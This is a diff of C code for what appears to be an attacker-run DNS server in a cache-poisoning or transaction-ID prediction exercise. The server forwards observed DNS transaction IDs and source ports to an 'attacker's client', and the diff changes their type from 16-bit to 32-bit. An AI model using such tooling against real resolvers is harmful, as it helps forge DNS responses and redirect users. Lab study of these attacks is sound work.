@@ -21,10 +21,10 @@
 #include <string.h>
 
 
-int send_txid(int client_sock, unsigned short txid, uint16_t source_port);
+int send_txid(int client_sock, uint32_t txid, uint16_t source_port);
 
 
-int create_dns_response(int txid, const char* query_name) {
+int create_dns_response(uint32_t txid, const char* query_name) {
     ldns_pkt *packet = NULL;
     ldns_rr *question_rr = NULL;
     ldns_rr *answer_rr = NULL;
@@ -113,7 +113,7 @@ int create_dns_response(int txid, const char* query_name) {
 
 
 // Function to send TXID and source port to the attacker’s client
-void send_to_attacker_client(uint16_t txid, uint16_t source_port) {
+void send_to_attacker_client(uint32_t txid, uint16_t source_port) {
     printf("send to attacker client\n");
     struct sockaddr_in client_addr;
     char message[64];
@@ -150,7 +150,7 @@ void send_to_attacker_client(uint16_t txid, uint16_t source_port) {
 }
 
 
-int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter, int client_sock){
+int even_odd_part(uint32_t txid, struct sockaddr_in client_addr, int* counter, int client_sock){
 
     // CHECK IF THE TXID IS ODD
     if (txid & 1){
@@ -179,13 +179,13 @@ int even_odd_part(uint16_t txid, struct sockaddr_in client_addr, int* counter, i
 
 //####################################################################################################################
 
-int send_txid(int client_sock, unsigned short txid, uint16_t source_port){
+int send_txid(int client_sock, uint32_t txid, uint16_t source_port){
     char buffer[BUFFER_SIZE];
 
     // TXID to send to the client (could be dynamically generated or static for simplicity)
 
     // Prepare the message to send to the client
-    snprintf(buffer, sizeof(buffer), "TXID: %hu, PORT: %u", txid, source_port);
+    snprintf(buffer, sizeof(buffer), "TXID: %u, PORT: %u", txid, source_port);
 
     // Send the TXID to the client
     if (send(client_sock, buffer, strlen(buffer), 0) < 0) {
@@ -194,7 +194,7 @@ int send_txid(int client_sock, unsigned short txid, uint16_t source_port){
         return EXIT_FAILURE;
     }
 
-    printf("Sent TXID to client: %hu\n, port: %u", txid, source_port);
+    printf("Sent TXID to client: %u\n, port: %u", txid, source_port);
     
     // Close the connection after sending the response
     close(client_sock);
@@ -305,7 +305,7 @@ int main() {
         }
 
         // extract the txid
-        uint16_t txid = ldns_pkt_id(query_pkt);
+        uint32_t txid = ldns_pkt_id(query_pkt);
         printf("Received query with TXID: %u \n", txid);
 
         even_found = even_odd_part(txid, client_addr, &counter, client_sock);
